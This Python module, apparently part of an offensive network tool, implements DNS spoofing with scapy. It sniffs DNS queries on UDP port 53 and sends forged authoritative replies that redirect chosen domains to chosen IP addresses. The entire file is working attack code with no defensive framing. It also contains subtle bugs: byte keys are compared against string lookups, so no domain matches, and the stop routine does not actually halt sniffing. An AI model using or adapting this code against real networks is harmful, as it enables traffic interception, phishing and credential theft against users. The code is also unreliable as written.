#!/usr/bin/env python3

"""
DNS Spoofing Strategy Module
----------------------

This module implements a DNS spoofing strategy for intercepting and modifying DNS requests.
"""

import threading

from scapy.all import DNS, DNSRR, IP, UDP, send, sniff
from .strategy import AttackStrategy
from ..exceptions.dns_exceptions import DnsSpoofingLoopError, DnsSpoofingStartError, DnsSpoofingStopError

class DnsSpoofStrategy(AttackStrategy):
    def __init__(self, domains_map: dict, logger):
        """
        Initializes the DNS spoofing strategy with a mapping of domains to IP addresses.

        :param domains_map: A dictionary mapping domain names to IP addresses.
        :param logger: Logger instance for logging events.
        """
        self._domains_map = {d.encode(): ip for d, ip in domains_map.items()}
        self._logger = logger
        self._thread = None

    def _spoof_callback(self, pkt) -> None:
        """
        Callback function to handle incoming DNS requests and send spoofed responses.

        :param pkt: The incoming packet.
        """
        try:
            if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0 and pkt.haslayer(IP) and pkt.haslayer(UDP):
                qname = pkt[DNS].qd.qname.rstrip(b'.') # Remove trailing dot

                # Convet to string for mapping easier
                qname_str = qname.decode(errors='ignore').lower()

                if qname_str in self._domains_map:
                    spoof_ip = self._domains_map[qname_str]

                    response = (
                        IP(dst=pkt[IP].src, src=pkt[IP].dst) /
                        UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) /
                        DNS(
                            id=pkt[DNS].id,
                            qr=1,
                            aa=1,
                            qd=pkt[DNS].qd,
                            an=DNSRR(rrname=qname + b'.', ttl=5,  rdata=spoof_ip)
                        )
                    )

                    send(response, verbose=False)
                    self._logger.log(f"[!] DNS spoofed: {qname_str} -> {spoof_ip}")
        except Exception as e:
            self._logger.log(f"[!] Error processing packet: {e}")
            raise DnsSpoofingLoopError() from e
        
    def start(self) -> None:
        """
        Starts the DNS spoofing strategy by initiating a packet sniffing thread.
        """
        try:
            if self._thread is None or not self._thread.is_alive():
                self._thread = threading.Thread(target=sniff, kwargs={
                    'filter': 'udp port 53',
                    'prn': self._spoof_callback,
                    'store': 0
                })
                self._thread.daemon = True
                self._thread.start()
                self._logger.log("[*] DNS spoofing started.")
            else:
                self._logger.log("[*] DNS spoofing is already running.")
        except Exception as e:
            self._logger.log(f"[!] Failed to start DNS spoofing: {e}")
            raise DnsSpoofingStartError() from e

    def stop(self) -> None:
        """
        Stops the DNS spoofing strategy by terminating the sniffing thread.
        """
        try:
            if self._thread is not None and self._thread.is_alive():
                self._thread.join(timeout=1)
                self._logger.log("[*] DNS spoofing stopped.")
            else:
                self._logger.log("[*] DNS spoofing is not running.")
        except Exception as e:
            self._logger.log(f"[!] Failed to stop DNS spoofing: {e}")
            raise DnsSpoofingStopError() from e
